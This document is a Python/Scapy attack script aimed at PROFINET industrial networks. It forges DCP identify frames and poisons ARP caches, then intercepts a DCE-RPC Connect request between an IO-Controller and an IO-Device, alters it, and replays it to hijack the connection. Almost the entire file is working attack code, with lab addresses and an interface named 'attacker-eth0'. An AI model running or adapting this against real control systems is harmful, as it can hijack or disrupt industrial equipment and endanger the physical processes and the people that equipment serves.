from scapy.all import *
import time

# from profinet_controller.protocol_machines.cpm.messages.pnio_ps import *
import scapy.all as scapy
from scapy.contrib.pnio_rpc import *
from scapy.contrib.dce_rpc import *
from scapy.contrib.pnio import *
from scapy.contrib.pnio_dcp import *

scapy.load_contrib("pnio_dcp")
load_contrib("pnio")
load_contrib("pnio_rpc")
load_contrib("dce_rpc")


# ---------------------------------------------------------------
# DESCRIPTION
# We want to forge the DCP-Communication between IO-Device and
# IO-Controller to forge the IP and NameOfStation Attributes
# of the DCP-Messages to manipulate the network parameters
# of the IO-Device.
# ---------------------------------------------------------------
def get_ident_msg(src, name_of_station):
    ether = scapy.Ether(dst="01:0e:cf:00:00:00", src=src, type=0x8892)
    pnio_msg = ProfinetIO(frameID=DCP_IDENTIFY_REQUEST_FRAME_ID)

    if name_of_station == "":
        dcp_data_length = 0
    else:
        dcp_data_length = len(name_of_station)
        +(5 if len(name_of_station) % 2 == 1 else 4)

    pnio_dcp_ident = ProfinetDCP(
        service_id=DCP_SERVICE_ID_IDENTIFY,
        service_type=DCP_REQUEST,
        xid=0x9A,
        reserved=1,
        dcp_data_length=dcp_data_length,  # if set 0, all devices with no name answer
        option=0x02,
        sub_option=0x02,
        dcp_block_length=len(name_of_station),
        name_of_station=name_of_station,
    )
    return ether / pnio_msg / pnio_dcp_ident


def spoof(target_ip, host_ip, target_mac, attacker_mac, iface):
    """
    Spoofs `target_ip` saying that we are `host_ip`.
    it is accomplished by changing the ARP cache of the target (poisoning)
    """
    # craft the arp 'is-at' operation packet, in other words; an ARP response
    # we don't specify 'hwsrc' (source MAC address)
    # because by default, 'hwsrc' is the real MAC address of the sender (ours)
    print("pdst", target_ip)

    arp_response = scapy.Ether(src=attacker_mac, dst=target_mac) / scapy.ARP(
        pdst=target_ip, hwdst=target_mac, psrc=host_ip, op="is-at"
    )
    # send the packet
    # verbose = 0 means that we send the packet without printing any thing
    sendp(arp_response, verbose=0, iface=iface)


# 00:1D:9C:C7:B0:70
# attacker-eth0
def stealARP(targetIp, hostIp, targetMac, hostMac, attackerMac, iface):
    def update_load(pkt):
        t = threading.currentThread()
        if pkt.haslayer("ARP"):
            if pkt["ARP"].pdst == targetIp and getattr(t, "arp_set_ip_discovered", False):
                arp_response = scapy.Ether(
                    src=targetMac, dst=hostMac
                ) / scapy.ARP(
                    pdst=hostIp,
                    hwdst=hostMac,
                    psrc=targetIp,
                    hwsrc=targetMac,
                    op="is-at",
                )
                # send the packet
                # verbose = 0 means that we send the packet without printing any thing
                sendp(arp_response, verbose=0, iface=iface)
                t = threading.currentThread()
                t.do_run = False
            elif pkt["ARP"].pdst == targetIp: 
                t.arp_set_ip_discovered = True

    def stopFilter(x):
        t = threading.currentThread()
        return not getattr(t, "do_run", True)

    sniff(
        filter=f"ether proto 0x0806 and ether src {hostMac}",
        store=0,
        count=-1,
        prn=update_load,
        iface=iface,
        stop_filter=stopFilter,
    )


def stealConnect(targetName, targetIp, hostIp, targetMac, hostMac, attackerMac, iface):
    def update_connect_load(pkt):
        if pkt.haslayer("UDP"):
            dce_pkt = DceRpc(pkt["Raw"].load)
            dce_pkt["IOCRBlockReq"].WatchdogFactor = 10
            eth_pkt = scapy.Ether(src=attackerMac, dst=targetMac)
            ip_msg = scapy.IP(dst=targetIp, src=hostIp)
            udp_msg = UDP(
                sport=49153,
                dport=34964,
            )
            # RESET MAC ENTRY OF DEVICE THAT IS ATTACKED THROUGH DCP IDENTIFY MSG
            pkt_to_send = eth_pkt / ip_msg / udp_msg / dce_pkt
            reset_mac_dev = get_ident_msg(attackerMac, targetName)
            sendp(reset_mac_dev, iface=iface)
            time.sleep(0.1)
            # RESET ARP ENTRY OF DEVICE THAT IS ATTACKED TO ROUTE CONNECT RSP TO HOST
            reset_ip_dev = scapy.ARP(
                pdst=hostIp, hwdst=hostMac, psrc=targetIp, hwsrc=targetMac
            )
            send(reset_ip_dev, iface=iface)
            time.sleep(0.1)
             # SEND ACTUAL FORGED CONNECT REQUEST TO DEVICE
            sendp(pkt_to_send, iface=iface)
            time.sleep(0.1)
            # RESET MAC ENTRY OF HOST IN SWITCH THROUGH ARP REQUEST
            send(
                scapy.ARP(pdst=hostIp),
                verbose=0,
                iface=iface
            )
            t = threading.currentThread()
            t.do_run = False

    def stopFilter(x):
        t = threading.currentThread()
        return not getattr(t, "do_run", True)

    sniff(
        filter=f"dst host {targetIp}",
        store=0,
        count=-1,
        prn=update_connect_load,
        iface=iface,
        stop_filter=stopFilter,
    )

stealARP = threading.Thread(
    target=stealARP,
    args=[
        "192.168.1.60",
        "192.168.1.10",
        "00:1D:9C:C8:BD:13",
        "00:1D:9C:C7:B0:70",
        "00:1D:9C:C8:BD:18",
        "attacker-eth0",
    ],
)
stealConnect = threading.Thread(
    target=stealConnect,
    args=[
        "dev3",
        "192.168.1.60",
        "192.168.1.10",
        "00:1D:9C:C8:BD:13",
        "00:1D:9C:C7:B0:70",
        "00:1D:9C:C8:BD:18",
        "attacker-eth0",
    ],
)


stealARP.start()
stealConnect.start()

# time.sleep(30)

# if steal.is_alive():
#     steal.join()
# if forge.is_alive():
#     forge.join()
